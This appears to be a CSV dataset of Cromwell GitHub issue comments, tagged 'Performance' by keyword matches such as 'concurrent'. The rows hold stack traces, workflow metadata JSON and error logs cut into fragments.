Performance,mwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352) ~[cromwell.jar:0.19]; at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.status(Run.scala:143) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.Run.checkStatus(Run.scala:156) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:933) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1$$anonfun$42.apply(JesBackend.scala:933) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:933) [cromwell.jar:0.19]; at cromwell.engine.backend.jes.JesBackend$$anonfun$poll$1.apply(JesBackend.scala:927) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.liftedTree1$1(Future.scala:24) [cromwell.jar:0.19]; at scala.concurrent.impl.Future$PromiseCompletingRunnable.run(Future.scala:24) [cromwell.jar:0.19]; at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40) [cromwell.jar:0.19]; at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:397) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979) [cromwell.jar:0.19]; at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107) [cromwell.jar:0.19]; ```. We suspect that of all the retries from the errors above plus the new succeeded tasks that now needed post processing created a backlog that may have cause Cromwell to become sluggish and eventu,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201:10382,concurren,concurrent,10382,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1248#issuecomment-237583201,1,['concurren'],['concurrent']
Performance,"n"": ""WaitingForValueStore"",; ""endTime"": ""2018-04-04T03:54:17.588Z""; }; ]; }; ],; ""MarkDuplicates.ClassicMarkDuplicates"": [; {; ""preemptible"": false,; ""executionStatus"": ""Running"",; ""stdout"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates/ClassicMarkDuplicates-stdout.log"",; ""backendStatus"": ""Running"",; ""shardIndex"": -1,; ""jes"": {; ""executionBucket"": ""gs://broad-dsde-methods/cromwell-execution-30"",; ""endpointUrl"": ""https://genomics.googleapis.com/"",; ""googleProject"": ""broad-dsde-methods""; },; ""runtimeAttributes"": {; ""preemptible"": ""0"",; ""failOnStderr"": ""false"",; ""bootDiskSizeGb"": ""10"",; ""disks"": ""local-disk 1 LOCAL"",; ""continueOnReturnCode"": ""0"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1"",; ""cpu"": ""4"",; ""noAddress"": ""false"",; ""zones"": ""us-central1-a,us-central1-b,us-east1-d,us-central1-c,us-central1-f,us-east1-c"",; ""memory"": ""16 GB""; },; ""callCaching"": {; ""allowResultReuse"": true,; ""effectiveCallCachingMode"": ""ReadAndWriteCache"",; ""hit"": false,; ""result"": ""Cache Miss""; },; ""inputs"": {; ""outputName"": ""md"",; ""bam"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-PreSort/md.sorted.bam"",; ""docker"": ""us.gcr.io/broad-gatk/gatk:4.0.2.1""; },; ""backendLabels"": {; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e"",; ""wdl-task-name"": ""classicmarkduplicates""; },; ""labels"": {; ""wdl-task-name"": ""ClassicMarkDuplicates"",; ""cromwell-workflow-id"": ""cromwell-01c7d76f-5b2b-48cd-be08-ce75b923666e""; },; ""jobId"": ""operations/EI-bgPCoLBiv-9bxttKRjqUBIJ-XkZe9BioPcHJvZHVjdGlvblF1ZXVl"",; ""backend"": ""JES"",; ""stderr"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates/ClassicMarkDuplicates-stderr.log"",; ""callRoot"": ""gs://broad-dsde-methods/cromwell-execution-30/MarkDuplicates/01c7d76f-5b2b-48cd-be08-ce75b923666e/call-ClassicMarkDuplicates"",; ""attempt"": 1,; ""backendLo",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328:4532,Cache,Cache,4532,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3483#issuecomment-379059328,1,['Cache'],['Cache']
Performance,"n$map$1.apply(Future.scala:237); 	at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:237); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); 	at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ```; ```; $ tail -n 10 stderr; Traceback (most recent call last):; File ""/src/Merge_MAFs.py"", line 182, in <module>; main(sys.argv[1:]); File ""/src/Merge_MAFs.py"", line 76, in main; concatenatedMafFilename = _handle_mafs(args); File ""/src/Merge_MAFs.py"", line 83, in _handle_mafs; mafPaths = _getMafPaths(args.mafpaths); File ""/src/Merge_MAFs.py"", line 98, in _getMafPaths; raise Exception(""MAF doesn't exist: %s"" % mafPath); Exception: MAF doesn't exist: /Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/cromwell-executions/aggregate_mafs_workflow/814c47aa-9d11-4c81-a08c-f2b77c002b46/call-aggregate_mafs/inputs/Users/dheiman/Documents/workspace/gdac-firecloud/tasks/aggregate_mafs/tests/TCGA-OR-A5J1-01A-11D-A29I-10.ff872fc4-bd1c-4975-85c8-3655ccd199a2.maf.txt; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918:7029,concurren,concurrent,7029,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1875#issuecomment-274088918,2,['concurren'],['concurrent']
Performance,n$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.core.actor.RobustClientHelperSpec.run(RobustClientHelperSpec.scala:14); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748). ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054:4799,Concurren,ConcurrentRestrictions,4799,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-451186054,7,"['Concurren', 'concurren']","['ConcurrentRestrictions', 'concurrent']"
Performance,n$run$1(FlatSpecLike.scala:1795); at org.scalatest.SuperEngine.runImpl(Engine.scala:521); at org.scalatest.FlatSpecLike.run(FlatSpecLike.scala:1795); at org.scalatest.FlatSpecLike.run$(FlatSpecLike.scala:1793); at cromwell.core.actor.RobustClientHelperSpec.run(RobustClientHelperSpec.scala:14); at org.scalatest.tools.Framework.org$scalatest$tools$Framework$$runSuite(Framework.scala:314); at org.scalatest.tools.Framework$ScalaTestTask.execute(Framework.scala:507); at sbt.TestRunner.runTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); ```,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183:4536,Concurren,ConcurrentRestrictions,4536,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4351#issuecomment-454822183,7,"['Concurren', 'concurren']","['ConcurrentRestrictions', 'concurrent']"
Performance,n(PipelinesApiAsyncBackendJobExecutionActor.scala:79); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:585); 	at ; cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:592); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:83); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1099); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$5.applyOrElse(StandardAsyncExecutionActor.scala:1095); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:413); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:37); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:60); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:91); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:12); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:81); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:91); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:40); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:44); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); `; [sampleData_gatk-sample-out_logging_outpu,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495:2785,concurren,concurrent,2785,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3861#issuecomment-455657495,1,['concurren'],['concurrent']
Performance,"n.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:21); at cromwell.engine.workflow.lifecycle.execution.callcaching.CallCacheWriteActor$$anonfun$1.apply(CallCacheWriteActor.scala:19); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply(BatchingExecutor.scala:91); at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:72); at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:90); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:415); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). [ERROR] [05/01/2017 21:06:41.921] [cromwell-system-akka.dispatchers.engine-dispatcher-106] [akka://cromwell-system/user/cromwell-service/WorkflowManagerActor] WorkflowManagerActor Workflow; 67fdb82c-72bb-4d33-a74b-441a8db2a780 failed (during ExecutingWorkflowState): Task m2.Mutect2.M2:108:1 failed. JES error code 10. Message: 15: Gsutil failed: failed to upload logs for ""gs:/; /broad-dsde-methods/lichtens/cromwell-executions-test-dl-oxoq-full/full_dl_ob_training_with_m2/67fdb82c-72bb-4d33-a74b-441a8db2a780/call-m2_nt/shard-37/Mutect2/71720e5e-1769-46e7-a2b8-98d19; ec38f93/call-M2/shard-108/"": cp failed: gsutil -h Content-type:text/plain -q -m cp /var/log/google-genomics/*.log gs://broa",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400:1387,concurren,concurrent,1387,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228#issuecomment-298632400,1,['concurren'],['concurrent']
Performance,n.mutable.ResizableArray$class.foreach(ResizableArray.scala:59) ~[cromwell.jar:0.19]; at scala.collection.mutable.ArrayBuffer.foreach(ArrayBuffer.scala:48) ~[cromwell.jar:0.19]; at scala.collection.TraversableLike$class.map(TraversableLike.scala:245) ~[cromwell.jar:0.19]; at scala.collection.AbstractTraversable.map(Traversable.scala:104) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$class.cromwell$engine$backend$Backend$$hashGivenDockerHash(Backend.scala:193) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at cromwell.engine.backend.Backend$$anonfun$hash$3.apply(Backend.scala:214) ~[cromwell.jar:0.19]; at scala.util.Success$$anonfun$map$1.apply(Try.scala:237) ~[cromwell.jar:0.19]; at scala.util.Try$.apply(Try.scala:192) ~[cromwell.jar:0.19]; at scala.util.Success.map(Try.scala:237) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.Future$$anonfun$map$1.apply(Future.scala:235) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run_aroundBody0(Promise.scala:32) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable$AjcClosure1.run(Promise.scala:1) ~[cromwell.jar:0.19]; at org.aspectj.runtime.reflect.JoinPointImpl.proceed(JoinPointImpl.java:149) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation$$anonfun$aroundExecution$1.apply(FutureInstrumentation.scala:44) ~[cromwell.jar:0.19]; at kamon.trace.Tracer$.withContext(TracerModule.scala:53) ~[cromwell.jar:0.19]; at kamon.scala.instrumentation.FutureInstrumentation.aroundExecution(FutureInstrumentation.scala:43) ~[cromwell.jar:0.19]; at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:31) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55) ~[cromwell.jar:0.19]; at akka.dispatch.BatchingExecutor$BlockableBatch$$anonfun$run$1.apply$mcV$sp(BatchingExecutor.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991:4399,concurren,concurrent,4399,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/775#issuecomment-216661991,1,['concurren'],['concurrent']
Performance,"nComponent.scala:29) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at scala.collection.Iterator$class.foreach(Iterator.scala:742) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterator.foreach(Iterator.scala:1194) ~[cromwell.jar:0.19]; at scala.collection.IterableLike$class.foreach(IterableLike.scala:72) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterable.foreach(Iterable.scala:54) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:158) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; 2016-04-26 18:26:09,846 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Call failed to initialize: Could not persist runtime attributes: Duplicate entry '163980-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; 2016-04-26 18:26:09,885 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272fc)]: persisting status of ComputeStatistics to Failed.; 2016-04-26 18:26:09,888 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Call failed to initialize: Could not persist runtime attributes: Duplicate entry '163979-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; 2016-04-26 18:26:09,889 cromwell-system-akka.actor.default-dispatcher-11 INFO - WorkflowActor [UUID(ea0272f",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251:10699,concurren,concurrent,10699,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251,1,['concurren'],['concurrent']
Performance,"nComponent.scala:29) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1$$anonfun$run$1.apply(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at scala.collection.Iterator$class.foreach(Iterator.scala:742) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterator.foreach(Iterator.scala:1194) ~[cromwell.jar:0.19]; at scala.collection.IterableLike$class.foreach(IterableLike.scala:72) ~[cromwell.jar:0.19]; at scala.collection.AbstractIterable.foreach(Iterable.scala:54) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:161) ~[cromwell.jar:0.19]; at slick.dbio.DBIOAction$$anon$1.run(DBIOAction.scala:158) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.liftedTree1$1(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at slick.backend.DatabaseComponent$DatabaseDef$$anon$2.run(DatabaseComponent.scala:237) ~[cromwell.jar:0.19]; at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142) ~[na:1.8.0_72]; at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617) ~[na:1.8.0_72]; at java.lang.Thread.run(Thread.java:745) ~[na:1.8.0_72]; 2016-04-26 18:26:09,846 cromwell-system-akka.actor.default-dispatcher-11 ERROR - WorkflowActor [UUID(ea0272fc)]: Could not persist runtime attributes; com.mysql.jdbc.exceptions.jdbc4.MySQLIntegrityConstraintViolationException: Duplicate entry '163980-preemptible' for key 'UK_RUNTIME_ATTRIBUTE'; at sun.reflect.NativeConstructorAccessorImpl.newInstance0(Native Method) ~[na:1.8.0_72]; at sun.reflect.NativeConstructorAccessorImpl.newInstance(NativeConstructorAccessorImpl.java:62) ~[na:1.8.0_72]; at sun.reflect.DelegatingConstructorAccessorImpl.newInstance(DelegatingConstructorAccessorImpl.java:45) ~[na:1.8.0_72]; at java.lang.reflect.Constructor.newInstance(Constructor.java:423) ~[na:1.8.0_72]; at com.mysql.jdbc.Util.handleNewInstance(Util.java:400) ~[cromwe",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251:6453,concurren,concurrent,6453,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/588#issuecomment-215113251,1,['concurren'],['concurrent']
Performance,nTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: Submitted did not equal Failed; at org.scalatest.MatchersHelper$.indicateFailure(MatchersHelper.scala:346); at org.scalatest.Matchers$ShouldMethodHelper$.shouldMatcher(Matchers.scala:6668); at org.scalatest.Matchers$AnyShouldWrapper.should(Matchers.scala:6716); at cromwell.CromwellTestKitSpec.verifyWorkflowState(CromwellTestKitSpec.scala:377); at cromwell.CromwellTestKitSpec.$anonfun$runWdl$1(CromwellTestKitSpec.scala:323); at scala.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593:4580,Concurren,ConcurrentRestrictions,4580,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4521#issuecomment-453539593,2,['Concurren'],['ConcurrentRestrictions']
Performance,"nTest$1(TestFramework.scala:113); at sbt.TestRunner.run(TestFramework.scala:124); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.$anonfun$apply$1(TestFramework.scala:282); at sbt.TestFramework$.sbt$TestFramework$$withContextLoader(TestFramework.scala:246); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFramework$$anon$2$$anonfun$$lessinit$greater$1.apply(TestFramework.scala:282); at sbt.TestFunction.apply(TestFramework.scala:294); at sbt.Tests$.processRunnable$1(Tests.scala:347); at sbt.Tests$.$anonfun$makeSerial$1(Tests.scala:353); at sbt.std.Transform$$anon$3.$anonfun$apply$2(System.scala:46); at sbt.std.Transform$$anon$4.work(System.scala:67); at sbt.Execute.$anonfun$submit$2(Execute.scala:269); at sbt.internal.util.ErrorHandling$.wideConvert(ErrorHandling.scala:16); at sbt.Execute.work(Execute.scala:278); at sbt.Execute.$anonfun$submit$1(Execute.scala:269); at sbt.ConcurrentRestrictions$$anon$4.$anonfun$submitValid$1(ConcurrentRestrictions.scala:178); at sbt.CompletionService$$anon$2.call(CompletionService.scala:37); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.Executors$RunnableAdapter.call(Executors.java:511); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1149); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:624); at java.lang.Thread.run(Thread.java:748); Cause: org.scalatest.exceptions.TestFailedException: isEmpty was false, and Some(false) did not contain true Instead, a.status.messages = List(Unknown status) and e.status.messages = List(womp womp); at org.scalatest.Assertions.newAssertionFailedException(Assertions.scala:528); at org.scalatest.Assertions.newAssertionFailedException$(Assertions.scala:527); at cromwell.core.TestKitSuite.newAssertionFailedException(TestKitSuite.scala:16); at org.scalatest.Assertions$AssertionsHelper.macr",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382:5306,Concurren,ConcurrentRestrictions,5306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4259#issuecomment-433056382,1,['Concurren'],['ConcurrentRestrictions']
